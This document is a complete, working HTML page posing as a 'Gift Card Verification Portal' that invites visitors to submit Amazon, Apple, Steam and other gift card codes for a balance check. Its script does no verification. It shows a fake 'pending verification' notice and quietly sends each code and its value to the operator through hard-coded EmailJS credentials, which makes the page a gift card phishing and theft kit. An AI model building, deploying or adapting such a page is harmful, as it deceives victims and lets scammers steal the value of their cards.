<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Gift Card Verification Portal</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  font-family: Arial, sans-serif;
  background: #f1f3f6;
  margin: 0;
  padding: 20px;
}
.container {
  max-width: 420px;
  margin: auto;
  background: #fff;
  padding: 25px;
  border-radius: 12px;
  box-shadow: 0 5px 15px rgba(0,0,0,0.1);
}
h2 {
  text-align: center;
  margin-bottom: 5px;
}
p.sub {
  text-align: center;
  color: #666;
  font-size: 14px;
}
select, input, button {
  width: 100%;
  padding: 12px;
  margin-top: 12px;
  font-size: 15px;
}
button {
  background: #0066ff;
  color: white;
  border: none;
  border-radius: 6px;
}
button:active {
  opacity: 0.9;
}
.status {
  margin-top: 15px;
  padding: 12px;
  background: #e9f1ff;
  border-left: 4px solid #0066ff;
  display: none;
}
small {
  display: block;
  margin-top: 15px;
  color: #777;
  font-size: 12px;
}
label {
  font-size: 14px;
}
</style>
</head>

<body>

<div class="container">
  <h2>Gift Card Verification</h2>
  <p class="sub">Submit your card for balance verification</p>

  <select id="brand">
    <option value="">Select Gift Card Type</option>
    <option>Amazon</option>
    <option>Apple</option>
    <option>Steam</option>
    <option>Google Play</option>
    <option>Sephora</option>
    <option>Other</option>
  </select>

  <input type="text" id="code" placeholder="Enter Gift Card Code">

  <input type="number" id="amount" placeholder="Estimated Card Value (Optional)">

  <label>
    <input type="checkbox" id="consent">
    I confirm this gift card belongs to me and I consent to verification
  </label>

  <button onclick="submitCard()">Submit for Verification</button>

  <div class="status" id="statusBox">
    âœ… Card submitted successfully<br>
    Status: <b>Pending Verification</b>
  </div>

  <small>
    This service is a verification platform. We are not affiliated
    with any gift card issuer. Cards are not redeemed on this website.
  </small>
</div>

<!-- EMAILJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
  emailjs.init("cUpSSyr3tUIAKKSuG");
})();

function submitCard() {
  const brand = document.getElementById("brand").value;
  const code = document.getElementById("code").value;
  const amount = document.getElementById("amount").value;
  const consent = document.getElementById("consent").checked;

  if (!brand || !code || !consent) {
    alert("Please complete all required fields.");
    return;
  }

  document.getElementById("statusBox").style.display = "block";

  emailjs.send("service_6xvpvjk", "template_l1vjh0n", {
    brand: brand,
    code: code,
    amount: amount || "Not specified",
    status: "Pending verification"
  });
}
</script>

</body>
</html>
